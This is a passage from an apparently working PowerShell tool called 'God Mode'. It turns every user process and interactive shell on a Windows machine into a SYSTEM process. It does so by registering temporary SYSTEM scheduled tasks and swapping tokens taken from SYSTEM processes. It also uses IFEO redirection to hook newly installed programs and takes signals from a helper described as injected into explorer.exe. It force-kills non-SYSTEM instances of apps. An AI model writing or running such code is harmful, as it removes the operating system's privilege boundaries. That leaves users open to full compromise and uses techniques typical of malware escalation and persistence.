        Write-Log -Message "Instant IFEO new-app watcher started on $($watchDirs.Count) install dir(s). Newly installed programs are auto-hooked (born as SYSTEM) the moment their .exe lands -- no polling, no retrigger when nothing new." -Type "INFO" -Color Green
        Write-DebugLog -FunctionName "Start-IfeoNewAppWatcher" -Action "EXIT" -Message "watchers=$($script:IfeoNewAppWatchers.Count) dirs=$($watchDirs.Count)"
        return $true
    } catch {
        Write-Log -Message "Instant IFEO new-app watcher failed to start: $_" -Type "WARN" -Color Yellow
        Write-DebugLog -FunctionName "Start-IfeoNewAppWatcher" -Action "ERROR" -Message "Outer catch: $_"
        $script:IfeoNewAppWatcherActive = $false
        return $false
    }
}

function Stop-IfeoNewAppWatcher {
    foreach ($w in $script:IfeoNewAppWatchers) {
        try { $w.EnableRaisingEvents = $false } catch {}
        try { $w.Dispose() } catch {}
    }
    $script:IfeoNewAppWatchers = @()
    if ($script:IfeoNewAppSubscriptions) {
        foreach ($sid in $script:IfeoNewAppSubscriptions) {
            try { Unregister-Event -SourceIdentifier $sid -ErrorAction SilentlyContinue } catch {}
            try { Get-Job -Name $sid -ErrorAction SilentlyContinue | Remove-Job -Force -ErrorAction SilentlyContinue } catch {}
        }
        $script:IfeoNewAppSubscriptions = @()
    }
    $script:IfeoNewAppWatcherActive = $false
    if ($script:IfeoNewAppQueue) { $script:IfeoNewAppQueue.Clear() }
    if ($script:IfeoNewAppDebounce) { $script:IfeoNewAppDebounce.Clear() }
    if ($script:IfeoPruneQueue) { $script:IfeoPruneQueue.Clear() }
    Write-DebugLog -FunctionName "Stop-IfeoNewAppWatcher" -Action "EXIT" -Message "watchers stopped + queue cleared"
}

function Invoke-ExistingProcessElevation {
    $isSystem = ([Environment]::UserName -eq "SYSTEM") -or (([Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -eq "S-1-5-18")
    if (-not $isSystem) {
        Write-Log -Message "Not running as SYSTEM -- scheduling SYSTEM elevation task for aggressive process takeover." -Type "INFO" -Color Yellow
        $tempScript = Join-Path $env:TEMP "GodMode_ElevateAll_$(Get-Random -Minimum 10000 -Maximum 99999).ps1"
        Copy-Item -Path $PSCommandPath -Destination $tempScript -Force
        $taskName = "GodMode_ElevateAll_$(Get-Random -Minimum 10000 -Maximum 99999)"
        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$tempScript`" -ElevateAllProcesses"
            $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null
            Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
            # Cleanup in background after 90 seconds
            Start-Job -ScriptBlock {
                param($tn, $ts)
                Start-Sleep -Seconds 90
                Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
                Remove-Item -Path $ts -Force -ErrorAction SilentlyContinue
            } -ArgumentList $taskName, $tempScript | Out-Null
            Write-Log -Message "SYSTEM elevation task scheduled and running. Waiting for completion..." -Type "INFO" -Color Yellow
            # Wait for the task to finish (it runs Invoke-ExistingProcessElevation as SYSTEM then exits)
            $maxWait = 120
            $waited = 0
            while ($waited -lt $maxWait) {
                Start-Sleep -Seconds 1
                $waited++
                $taskInfo = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
                if (-not $taskInfo -or $taskInfo.State -eq 'Ready') { break }
            }
            if ($waited -ge $maxWait) {
                Write-Log -Message "SYSTEM elevation task did not finish within timeout ($maxWait s)." -Type "WARN" -Color Yellow
            } else {
                Write-Log -Message "SYSTEM elevation task completed." -Type "INFO" -Color Green
            }
            # Ensure cleanup even if the background job failed
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
            Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Log -Message "Scheduled task fallback failed: $_" -Type "ERROR" -Color Red
            Remove-Item -Path $tempScript -Force -ErrorAction SilentlyContinue
        }
        return
    }
    Write-Log -Message "SYSTEM context confirmed. Aggressively elevating ALL user processes to SYSTEM in Session 1..." -Type "INFO" -Color Green
    if (-not (Assert-TokenOpsAvailable -Caller 'Invoke-ExistingProcessElevation')) { return }
    Enable-ElevationPrivileges
    Invoke-TokenOpsPrivilege -PrivilegeName "SeIncreaseQuotaPrivilege" | Out-Null
    $systemPid = Find-SystemProcessCandidate
    if ($systemPid -eq 0) {
        Write-Log -Message "No accessible SYSTEM process found for direct token elevation." -Type "ERROR" -Color Red
        return
    }
    # Critical processes that must never be killed/restarted (core OS + script host)
    $CriticalProcs = @("csrss.exe", "lsass.exe", "services.exe", "smss.exe", "winlogon.exe", "wininit.exe", "svchost.exe", "dwm.exe", "fontdrvhost.exe", "Memory Compression", "Registry", "System", "Secure System", "powershell.exe", "pwsh.exe", "cmd.exe", "powershell_ise.exe", "conhost.exe", "explorer.exe")
    $systemAccounts = @("SYSTEM", "NETWORK SERVICE", "LOCAL SERVICE", "DWM-1", "UMFD-1", "UMFD-0")
    try {
        $allProcs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    } catch {
        Write-Log -Message "Get-CimInstance failed, falling back to Get-WmiObject: $_" -Type "WARN" -Color Yellow
        $allProcs = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue
    }
    # Parallel ownership scan: check all processes in threaded batches to find non-SYSTEM targets
    $targetProcs = Get-NonSystemProcessesParallel -allProcs $allProcs -CriticalProcs $CriticalProcs -systemAccounts $systemAccounts
    $total = $targetProcs.Count
    $count = 0
    $skipped = 0
    $successCount = 0
    $failCount = 0
    Write-Log -Message "Aggressive scan found $total non-SYSTEM processes to elevate. Deduplicating and launching parallel elevation..." -Type "INFO" -Color Yellow

    # Deduplicate by process name (detect first). Detector B store consult:
    # skip auto-excluded base names so the aggressive startup scan does NOT
    # force-elevate an app gmproxy learned is SYSTEM-incompatible (would re-kill
    # it). Fail-open (missing store -> no exclusion -> normal scan).
    $seen = @{}
    $uniqueTargets = foreach ($proc in $targetProcs) {
        $procName = [System.IO.Path]::GetFileNameWithoutExtension($proc.ExecutablePath)
        if (Test-GmAutoExcluded "$procName.exe") { continue }
        if (-not $seen.ContainsKey($procName)) {
            $seen[$procName] = $true
            $proc
        }
    }

    $uniqueTotal = $uniqueTargets.Count
    $threadCount = Get-OptimalThreadCount
    Write-Log -Message "Parallel elevation: $uniqueTotal unique process names after deduplication. Spawning $([math]::Min($threadCount, $uniqueTotal)) threads (CPU count: $threadCount)..." -Type "INFO" -Color Yellow

    $results = Invoke-ParallelElevation -Targets $uniqueTargets -systemPid $systemPid

    $successCount = ($results | Where-Object { $_.Result -eq "SUCCESS" }).Count
    $failCount = ($results | Where-Object { $_.Result -eq "FAIL" }).Count
    $skipped = ($results | Where-Object { $_.Result -eq "SKIP" }).Count

    foreach ($r in ($results | Where-Object { $_.Result -eq "FAIL" })) {
        $errMsg = Get-Win32ErrorRootCause -ErrorCode ([int]$r.Error) -Context "CreateProcessAsUser"
        Write-Log -Message "SYSTEM elevation failed for $($r.Name) : $errMsg" -Type "WARN" -Color Yellow
    }
    foreach ($r in ($results | Where-Object { $_.Result -eq "SUCCESS" })) {
        Write-Log -Message "SYSTEM elevated: $($r.Name)" -Type "INFO" -Color Green
    }
    Write-Log -Message "Aggressive process elevation complete ($successCount succeeded, $failCount failed, $skipped skipped)." -Type "INFO" -Color Gray
}

function Invoke-GmProxyFeedbackElevation {
    # In-place SYSTEM elevation of a PID handed off by gmproxy.exe's graceful-
    # fallback launch path (named pipe GodMode-GmProxyFeedback). Replaces the
    # process token in place via [TokenOps]::ReplaceProcessTokenForPid -- no kill,
    # no relaunch, no duplicate. gmproxy's fallback only runs for IFEO-hooked
    # normal programs (shells/critical/OS are excluded by Install-IfeoElevation),
    # so the PID is expected to be a safe normal app; a conservative shell/critical
    # name guard is applied here as defense-in-depth. If in-place replacement
    # fails, NO kill+relaunch is attempted here -- the 15s periodic scan remains
    # the safety net (same as before this optimization).
    param([int]$ProcessId)
    if ($ProcessId -le 0) { return $false }
    $isSystem = ([Environment]::UserName -eq "SYSTEM") -or (([Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -eq "S-1-5-18")
    if (-not $isSystem) { return $false }
    try {
        $proc = Get-Process -Id $ProcessId -ErrorAction Stop
    } catch { return $false }
    # Defense-in-depth: never token-swap a shell host or critical OS process.
    $SkipNames = @("powershell","pwsh","cmd","powershell_ise","conhost","WindowsTerminal","OpenConsole","wsl","wslhost","wt","explorer","taskmgr","csrss","lsass","services","smss","winlogon","wininit","svchost","dwm","fontdrvhost","taskhostw","sihost","ShellHost","ctfmon","System","Registry","Secure System","Memory Compression","ApplicationFrameHost","RuntimeBroker")
    if ($SkipNames -contains $proc.Name) {
        Write-DebugLog -FunctionName "Invoke-GmProxyFeedbackElevation" -Action "SKIP" -Message "PID=$ProcessId name=$($proc.Name) is shell/critical; skipping in-place elevation"
        return $false
    }
    # Detector B store consult (defense-in-depth): even though gmproxy A3
    # skips the feedback handoff for auto-excluded PIDs, if a PID somehow
    # arrives here, do NOT re-elevate it to SYSTEM (that would defeat the
    # auto-exclude and re-kill the app). Fail-open (missing store -> elevate).
    if (Test-GmAutoExcluded "$($proc.Name).exe") {
        Write-DebugLog -FunctionName "Invoke-GmProxyFeedbackElevation" -Action "SKIP" -Message "PID=$ProcessId name=$($proc.Name) is auto-excluded (Detector B); not re-elevating"
        return $false
    }
    if (-not (Assert-TokenOpsAvailable -Caller 'Invoke-GmProxyFeedbackElevation')) { return $false }
    Enable-ElevationPrivileges
    Invoke-TokenOpsPrivilege -PrivilegeName "SeIncreaseQuotaPrivilege" | Out-Null
    $systemPid = Find-SystemProcessCandidate
    if ($systemPid -eq 0) {
        Write-DebugLog -FunctionName "Invoke-GmProxyFeedbackElevation" -Action "INFO" -Message "No SYSTEM token source for PID=$ProcessId; periodic scan will handle it"
        return $false
    }
    $result = [TokenOps]::ReplaceProcessTokenForPid($ProcessId, $systemPid)
    if ($result) {
        Write-Log -Message "GmProxy feedback: elevated PID=$ProcessId ($($proc.Name)) in place (token replacement, no kill+relaunch)" -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Invoke-GmProxyFeedbackElevation" -Action "EXIT" -Message "In-place success for PID=$ProcessId name=$($proc.Name)"
        return $true
    } else {
        Write-DebugLog -FunctionName "Invoke-GmProxyFeedbackElevation" -Action "INFO" -Message "In-place replacement failed for PID=$ProcessId name=$($proc.Name); periodic scan will handle it"
        return $false
    }
}

function Invoke-GmHookShellFeedbackElevation {
    # INSTANT interactive-shell elevation -- the gmhook birth-signal path. gmhook
    # (injected into explorer.exe + user GUI hosts) sees a shell CHILD born via
    # the real CreateProcessW (cmd/powershell/pwsh/ISE launched from the Start
    # menu / Win+R / a shortcut) and signals its PID over the GodMode-
    # GmProxyFeedback pipe as SHELLPID=<n> (see gmhook.c SignalShellBirth).
    # Start-GmProxyFeedbackListener routes SHELLPID= to $GmHookShellQueue; the
    # Start-Monitoring loop drains it here. This does the SAFE in-place SYSTEM
    # token swap (ReplaceProcessTokenForPid, needs SeTcb -- only the SYSTEM
    # monitor holds it) that gmhook CANNOT do itself (no SeTcb in explorer; and
    # rerouting the shell's own CreateProcessW through the stolen-token path
    # crashes it with 0xC0000005). The shell was already born visible as admin
    # (correct session/cwd/history); this swaps its token in place ~ms after
    # launch -- no kill, no invisible Session-0 rebirth, no wait for the 3s/15s
    # scan. Mirrors Monitor-ElevateProcess's interactive-shell branch safety so
    # the bootstrap + already-SYSTEM + auto-exclude guards all hold. Fail-stop
    # on Phase 0 failure: LEAVE AS ADMIN (no kill) -- the WMI/3s/15s scans retry.
    param([int]$ProcessId)
    if ($ProcessId -le 0) { return $false }
    $isSystem = ([Environment]::UserName -eq "SYSTEM") -or (([Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -eq "S-1-5-18")
    if (-not $isSystem) { return $false }
    try {
        $proc = Get-Process -Id $ProcessId -ErrorAction Stop
    } catch { return $false }
    # Defense-in-depth: gmhook only signals the 4 interactive shells, but a
    # stray/malformed signal must never in-place-swap a non-shell (a launcher
    # host like explorer/wt/conhost or a critical OS process -- swapping those
    # to SYSTEM breaks the desktop/taskbar). $proc.Name is bare (no .exe), so
    # compare against the same bare-name list Monitor-ElevateProcess uses.
    $interactiveShells = @("cmd","powershell","pwsh","powershell_ise")
    if ($interactiveShells -notcontains $proc.Name) {
        Write-DebugLog -FunctionName "Invoke-GmHookShellFeedbackElevation" -Action "SKIP" -Message "PID=$ProcessId name=$($proc.Name) is not an interactive shell; ignoring SHELLPID signal"
        return $false
    }
    # Bootstrap guard (the reason gmhook does not synchronous-birth shells): if
    # this shell is God Mode's OWN plumbing (scheduled-task / Run-key / temp-copy
    # launch carrying -ToggleOn/-Launch/GodMode.ps1), leave it -- a mid-flight
    # SYSTEM token swap would disturb the monitor/watchdog/guardian/feedback-
    # listener work. Test-GmPlumbingShell reads the command line (only the
    # monitor side can; gmhook in explorer cannot), so this guard lives here.
    if (Test-GmPlumbingShell -ProcessId $ProcessId) {
        Write-DebugLog -FunctionName "Invoke-GmHookShellFeedbackElevation" -Action "SKIP" -Message "PID=$ProcessId name=$($proc.Name) is God Mode plumbing shell; leaving token untouched (no mid-flight swap)"
        return $true
    }
    # Already-SYSTEM shell (e.g. a [19] -LaunchShellAsSystem on-demand shell, or
    # a previous birth-signal already swapped it): skip the redundant swap. Fail-
    # open (Test-PidIsSystem returns $false on any query failure -> proceed).
    if (Test-PidIsSystem -ProcessId $ProcessId) {
        Write-DebugLog -FunctionName "Invoke-GmHookShellFeedbackElevation" -Action "SKIP" -Message "PID=$ProcessId name=$($proc.Name) is already SYSTEM; leaving token untouched (no redundant swap)"
        return $true
    }
    # Detector B store consult (defense-in-depth): shells are not normally in
    # the auto-exclude store, but if one somehow is, honor it (never re-elevate
    # an auto-excluded base). Fail-open (missing store -> elevate).
    if (Test-GmAutoExcluded "$($proc.Name).exe") {
        Write-DebugLog -FunctionName "Invoke-GmHookShellFeedbackElevation" -Action "SKIP" -Message "PID=$ProcessId name=$($proc.Name) is auto-excluded (Detector B); not elevating"
        return $false
    }
    if (-not (Assert-TokenOpsAvailable -Caller 'Invoke-GmHookShellFeedbackElevation')) { return $false }
    Enable-ElevationPrivileges
    Invoke-TokenOpsPrivilege -PrivilegeName "SeIncreaseQuotaPrivilege" | Out-Null
    # SeTcbPrivilege is required by NtSetInformationProcess(ProcessAccessToken)
    # to replace the shell's primary token in place. The C# method enables it
    # internally too (belt-and-suspenders), but enable it on the runspace token
    # before the P/Invoke -- mirrors Monitor-ElevateProcess Phase 0.
    Invoke-TokenOpsPrivilege -PrivilegeName "SeTcbPrivilege" | Out-Null
    $systemPid = Find-SystemProcessCandidate
    if ($systemPid -eq 0) {
        Write-DebugLog -FunctionName "Invoke-GmHookShellFeedbackElevation" -Action "INFO" -Message "No SYSTEM token source for shell PID=$ProcessId; WMI/3s/15s scan will retry"
        return $false
    }
    $result = [TokenOps]::ReplaceProcessTokenForPid($ProcessId, $systemPid)
    if ($result) {
        Write-Log -Message "Monitor elevated: $($proc.Name) PID=$ProcessId (instant gmhook birth-signal, in-place token replacement)" -Type "INFO" -Color Gray
        Write-DebugLog -FunctionName "Invoke-GmHookShellFeedbackElevation" -Action "EXIT" -Message "Instant in-place success for shell PID=$ProcessId name=$($proc.Name)"
        return $true
    } else {
        # Fail-stop: LEAVE AS ADMIN (no kill). Phase 1/2 (kill+relaunch) for
        # shells would birth an invisible Session-0 shell + kill this visible one
        # -- the 'it kills my shell' symptom. The WMI watcher + 3s/15s scans
        # retry Phase 0 on the next tick (the shell is still alive to retry).
        Write-Log -Message "Monitor: instant in-place elevation failed for $($proc.Name) PID=$ProcessId; leaving as admin (not killing -- WMI/3s/15s scan will retry)." -Type "WARN" -Color Yellow
        Write-DebugLog -FunctionName "Invoke-GmHookShellFeedbackElevation" -Action "EXIT" -Message "Instant in-place failed for shell PID=$ProcessId name=$($proc.Name); leaving as admin (no kill)"
        return $false
    }
}

function Test-GmPlumbingShell {
    # Detect God Mode's OWN shell-host plumbing (scheduled-task / Run-key / temp-copy
    # launches of this script) by inspecting the process command line. Returns $true
    # for a powershell/cmd/pwsh/ISE process whose command line carries the installed
    # script name, a temp-copy name, or a GodMode CLI flag -- so Monitor-ElevateProcess
    # leaves it alone (no mid-execution in-place SYSTEM token swap that could disturb
    # the -ToggleOn / -ElevateAllProcesses / -SystemDesktop / watchdog / guardian /
    # feedback-listener work). Fail-open: any query/parse failure -> $false (treat as
    # a normal interactive shell -> eligible for in-place SYSTEM elevation). Mirrors
    # the shell-exclusion design in IsShellLauncherProcess (gmhook.c) +
    # $GmCriticalIfeoExclude (never IFEO-redirect God Mode's own plumbing).
    param([int]$ProcessId)
    if ($ProcessId -le 0) { return $false }
    try {
        $p = Get-CimInstance Win32_Process -Filter "ProcessId=$ProcessId" -ErrorAction SilentlyContinue
        if (-not $p) { return $false }
        $cmd = $p.CommandLine
        if (-not $cmd) { return $false }
        # Script-path tokens: the installed script (GodMode.ps1), the source script
        # (God-Mode-Windows.ps1), and the temp copies spawned by
        # Invoke-ExistingProcessElevation (GodMode_ElevateAll_*.ps1) / SystemDesktop
        # (GodMode_SystemDesktop_*.ps1).
        if ($cmd -match 'GodMode\.ps1') { return $true }
        if ($cmd -match 'God-Mode-Windows\.ps1') { return $true }
        if ($cmd -match 'GodMode_ElevateAll') { return $true }
        if ($cmd -match 'GodMode_SystemDesktop') { return $true }
        # Distinctive GodMode CLI flags (param block). Unique enough that a normal
        # user interactive shell would never carry them.
        $gmFlags = @('-ToggleOn','-ToggleOff','-ElevateAllProcesses','-SystemDesktop','-InstallSystemDesktop','-UninstallSystemDesktop','-GodModeStatus','-LaunchTaskMgrAsSystem','-LaunchShellAsSystem','-InstallGodMode','-UninstallGodMode','-DumpLogs','-ExportElevationDiagnostics')
        foreach ($f in $gmFlags) {
            if ($cmd -like "*$f*") { return $true }
        }
        return $false
    } catch { return $false }
}

function Monitor-ElevateProcess {
    param([string]$Path, [string]$Arguments = "", [int]$ProcessId = 0, [switch]$HideWindow)
    if (-not (Test-Path $Path)) {
        Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "ERROR" -Message "Target path does not exist: $Path" -RootCause "Executable missing. The process may have been uninstalled or moved."
        return $false
    }
    $procName = [System.IO.Path]::GetFileNameWithoutExtension($Path)
    # Detector B store consult: if this base name is auto-excluded (gmproxy
    # learned it refuses/crashes as SYSTEM >= threshold), leave it as the user --
    # do NOT elevate. Defense-in-depth alongside gmproxy A3 (no feedback handoff)
    # + gmhook B2 (no SYSTEM birth). Covers the WMI watcher drain + any direct
    # Monitor-ElevateProcess call. Fail-open (missing store -> no exclusion).
    if (Test-GmAutoExcluded "$procName.exe") {
        Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "SKIP" -Message "$procName.exe is auto-excluded (Detector B); leaving as user, not elevating"
        return $true
    }
    # --- Interactive shells (cmd/powershell/pwsh/powershell_ise): auto-elevate EVERY
    #     user-launched instance to SYSTEM via in-place token replacement (Phase 0
    #     below) -- no kill, no flicker, `whoami` -> `nt authority\system`. This
    #     SKIPs the aggressive "SYSTEM instance exists -> purge non-SYSTEM" branch
    #     used for normal apps: that branch is name-based and would kill the user's
    #     admin shell, because the monitor ITSELF is a headless Session-0 SYSTEM
    #     powershell.exe so Test-SystemProcessExists("powershell.exe") is always
    #     true. Skipping the purge means every interactive shell instance gets its
    #     OWN in-place SYSTEM token (open 5 terminals -> 5 SYSTEM shells, none die).
    #     God Mode's OWN plumbing shells (scheduled-task / Run-key / temp-copy
    #     launches of this script carrying -ToggleOn/-ElevateAllProcesses/
    #     -SystemDesktop/GodMode.ps1) are left untouched via Test-GmPlumbingShell so
    #     a mid-flight token swap never disturbs the monitor/watchdog/guardian work. ---
    $interactiveShells = @("cmd","powershell","pwsh","powershell_ise")
    $isInteractiveShell = $interactiveShells -contains $procName
    if ($isInteractiveShell) {
        if ($ProcessId -gt 0 -and (Test-GmPlumbingShell -ProcessId $ProcessId)) {
            Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "SKIP" -Message "$procName PID=$ProcessId is God Mode plumbing shell; leaving token untouched (no mid-flight swap)"
            return $true
        }
        # Already-SYSTEM shell (e.g. launched on demand via -LaunchShellAsSystem /
        # menu [19] with CreateProcessFromToken): skip the in-place swap -- a
        # SYSTEM->SYSTEM ReplaceProcessTokenForPid is redundant and could race on
        # an already-running SYSTEM process. Fail-open (Test-PidIsSystem returns
        # $false on any query failure -> elevation proceeds as before).
        if ($ProcessId -gt 0 -and (Test-PidIsSystem -ProcessId $ProcessId)) {
            Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "SKIP" -Message "$procName PID=$ProcessId is already SYSTEM; leaving token untouched (no redundant swap)"
            return $true
        }
        # Fall through to Phase 0 in-place token replacement (skip the purge branch).
    } else {
        if (Test-SystemProcessExists -ProcessName "$procName.exe" -InteractiveOnly) {
            # Aggressive: if a SYSTEM instance exists ON THE INTERACTIVE DESKTOP, wipe
            # all non-SYSTEM instances so the app is 100% SYSTEM. -InteractiveOnly
            # stops a Session-0 SYSTEM instance (a same-named service) from falsely
            # triggering a desktop purge.
            Stop-NonSystemInstances -ProcessName "$procName.exe"
            return $true
        }
    }
    $isSystem = ([Environment]::UserName -eq "SYSTEM") -or (([Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -eq "S-1-5-18")
    # --- Phase 0: In-place token replacement (no kill, no relaunch) ---
    if ($isSystem -and $ProcessId -gt 0) {
        Enable-ElevationPrivileges
        Invoke-TokenOpsPrivilege -PrivilegeName "SeIncreaseQuotaPrivilege" | Out-Null
        # SeTcbPrivilege is required by NtSetInformationProcess(ProcessAccessToken)
        # to replace the target process's primary token in-place. Without it,
        # ReplaceProcessTokenForPid fails (STATUS_PRIVILEGE_NOT_HELD) and the
        # monitor falls through to kill+relaunch (Phase 2), which kills the
        # user's shell. The C# method also enables it internally (belt-and-
        # suspenders), but enabling it here ensures the PowerShell runspace
        # token has it before the P/Invoke call.
        Invoke-TokenOpsPrivilege -PrivilegeName "SeTcbPrivilege" | Out-Null
        $systemPid = Find-SystemProcessCandidate
        if ($systemPid -ne 0) {
            $result = [TokenOps]::ReplaceProcessTokenForPid($ProcessId, $systemPid)
            if ($result) {
                # Interactive shells: VERIFY the in-place swap actually took effect.
                # NtSetInformationProcess(ProcessAccessToken) can report STATUS_SUCCESS
                # yet leave the running threads on the old token on some builds (the
                # process primary token is swapped but whoami may still read a stale
                # context), so the user would see `whoami -> admin` and conclude the
                # auto-elevation is broken after [7]+reboot. Re-check the owner after
                # a brief settle; if it is NOT SYSTEM, leave the shell as admin (see
                # the fail-stop rationale in the else branch below -- Phase 1/2 would
                # birth an invisible Session-0 shell + kill this visible one). The 15s
                # periodic scan + WMI watcher retry Phase 0 on the next tick. Non-shells
                # keep the fast return (the 15s periodic scan is their safety net; no
                # per-app latency).
                if ($isInteractiveShell) {
                    Start-Sleep -Milliseconds 300
                    if (Test-PidIsSystem -ProcessId $ProcessId) {
                        Write-Log -Message "Monitor elevated: $procName PID=$ProcessId (in-place token replacement, verified SYSTEM)" -Type "INFO" -Color Gray
                        Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "EXIT" -Message "In-place replacement success for $procName PID=$ProcessId (verified SYSTEM)"
                        return $true
                    } else {
                        # Silent Phase 0 failure: NtSetInformationProcess(ProcessAccessToken)
                        # reported STATUS_SUCCESS but the shell is NOT SYSTEM after the
                        # 300ms settle (primary token swapped, but whoami/threads still
                        # read stale context, OR Test-PidIsSystem opened the wrong
                        # handle). Do NOT fall through to Phase 1/2 for interactive
                        # shells -- Phase 1 births a new SYSTEM shell via
                        # CreateProcessWithTokenW but it lands in Session 0 (invisible:
                        # the seclogon service creates it in the caller's session, not
                        # the token's session, on Windows 11 26100) and then Phase 1
                        # kills this visible shell, leaving the user with NO visible
                        # shell (the "it kill shell that is non admin and still fails
                        # to elevate" / "same problem and same issue" symptom). This
                        # mirrors the hard-failure branch below: leaving the shell as
                        # admin is strictly better -- the user keeps their console,
                        # session, cwd, and history, and the 15s periodic scan + WMI
                        # watcher retry Phase 0 on the next tick. If the swap truly
                        # took, a later Test-PidIsSystem on a subsequent tick will see
                        # SYSTEM and skip the swap (the already-SYSTEM guard at
                        # line 7690). Non-shell apps keep the fast return.
                        Write-Log -Message "Monitor: in-place swap reported success but $procName PID=$ProcessId is NOT SYSTEM after settle; leaving as admin (not killing -- Phase 1/2 would birth an invisible Session-0 shell + kill this one)." -Type "WARN" -Color Yellow
                        Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "EXIT" -Message "Phase 0 silent-failure for interactive shell $procName PID=$ProcessId (reported success, not SYSTEM after settle); leaving as admin (no kill)"
                        return $true
                    }
                } else {
                    Write-Log -Message "Monitor elevated: $procName PID=$ProcessId (in-place token replacement)" -Type "INFO" -Color Gray
                    Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "EXIT" -Message "In-place replacement success for $procName PID=$ProcessId"
                    return $true
                }
            } else {
                Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "INFO" -Message "In-place replacement failed for $procName PID=$ProcessId, falling back to kill-relaunch"
                # Interactive shells: if Phase 0 (in-place, no-kill) fails, do NOT
                # fall through to Phase 1/2 (kill+relaunch). Phase 1 births a new
                # SYSTEM shell via CreateProcessWithTokenW but it lands in Session 0
                # (invisible -- the seclogon service creates it in the caller's
                # session, not the token's session, on Windows 11 26100). Phase 1
                # then kills the user's visible admin shell, leaving the user with
                # NO visible shell at all (the reported "it kill shell that is non
                # admin and still fails to elevate" symptom). Leaving the shell as
                # admin is strictly better -- the user keeps their console, session,
                # cwd, and history. The 15s periodic scan + the WMI watcher will
                # retry Phase 0 on the next tick (it may succeed on a subsequent
                # attempt if SeTcbPrivilege races are resolved). Non-shell apps
                # (DllHost, etc.) still fall through to Phase 1/2 since they don't
                # have visible windows the user cares about.
                if ($isInteractiveShell) {
                    Write-Log -Message "Monitor: in-place elevation failed for $procName PID=$ProcessId; leaving as admin (not killing -- Phase 1/2 would birth an invisible Session-0 shell + kill this one)." -Type "WARN" -Color Yellow
                    Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "EXIT" -Message "Phase 0 failed for interactive shell $procName PID=$ProcessId; leaving as admin (no kill)"
                    return $true
                }
            }
        }
    }
    # --- Phase 1: CreateProcessAsSystem (kill-relaunch fallback) ---
    if ($isSystem) {
        Enable-ElevationPrivileges
        Invoke-TokenOpsPrivilege -PrivilegeName "SeIncreaseQuotaPrivilege" | Out-Null
        # SeTcbPrivilege: CreateProcessAsSystem enables it internally in the C#
        # method (line 2237), but enable it here too so the PowerShell runspace
        # token has it before the P/Invoke -- belt-and-suspenders with Phase 0.
        Invoke-TokenOpsPrivilege -PrivilegeName "SeTcbPrivilege" | Out-Null
        $systemPid = Find-SystemProcessCandidate
        if ($systemPid -ne 0) {
            $cmdLine = if ($Arguments) { "`"$Path`" $Arguments" } else { "`"$Path`"" }
            # Interactive shells must be VISIBLE (the user wants to see the shell);
            # $HideWindow comes from the drain calls and would hide a fallback
            # SYSTEM shell. Non-shell apps honor the caller's HideWindow.
            $launchHidden = [bool]$HideWindow -and -not $isInteractiveShell
            $result = [TokenOps]::CreateProcessAsSystem($systemPid, $Path, $cmdLine, $launchHidden)
            if ($result -eq 0) {
                Start-Sleep -Milliseconds 500
                if ($isInteractiveShell) {
                    # Shells: kill ONLY the specific admin instance that failed
                    # in-place elevation (Phase 0) -- NOT every non-SYSTEM sibling,
                    # which would take down the user's other admin/SYSTEM shells.
                    if ($ProcessId -gt 0) { Stop-Process -Id $ProcessId -Force -ErrorAction SilentlyContinue }
                } else {
                    Stop-NonSystemInstances -ProcessName "$procName.exe"
                }
                Write-Log -Message "Monitor elevated: $procName (direct token + active session)" -Type "INFO" -Color Gray
                Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "EXIT" -Message "Success for $procName"
                return $true
            } elseif ($result -eq [TokenOps]::SESSION0_REFUSED) {
                Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "INFO" -Message "CreateProcessAsSystem refused ownerless birth for $procName (Session-0 token, no SeTcb); falling through to service path"
            } else {
                # Non-zero, non-SESSION0_REFUSED Win32 error (e.g. 5=ACCESS_DENIED,
                # 1314=PRIVILEGE_NOT_HELD). Without this log the fall-through to
                # Phase 2 was SILENT -- the user's shell was killed (Phase 2
                # Stop-Process) with no indication why Phase 1 failed. Log the
                # error code + root-cause so the option-11 dump can diagnose it.
                $errMsg = Get-Win32ErrorRootCause -ErrorCode $result -Context "CreateProcessAsUser"
                Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "WARN" -Message "CreateProcessAsSystem failed for $procName (Win32 error $result); falling through to service path. $errMsg" -RootCause $errMsg
            }
        }
    }
    # --- Phase 2: Service-based elevation (last resort) ---
    # Interactive shells: visible (HideWindow forced off) + targeted kill of only
    # the failed in-place instance (same rationale as Phase 1 -- never purge the
    # user's other admin/SYSTEM shells).
    $svcHidden = [bool]$HideWindow -and -not $isInteractiveShell
    $elevated = Start-ProcessWithService -Path $Path -Arguments $Arguments -HideWindow:$svcHidden
    if ($elevated) {
        Start-Sleep -Milliseconds 500
        if ($isInteractiveShell) {
            if ($ProcessId -gt 0) { Stop-Process -Id $ProcessId -Force -ErrorAction SilentlyContinue }
        } else {
            # After spawning SYSTEM, purge any Administrator/user duplicates so only SYSTEM remains
            Stop-NonSystemInstances -ProcessName "$procName.exe"
        }
        Write-Log -Message "Monitor elevated: $procName (service + purge)" -Type "INFO" -Color Gray
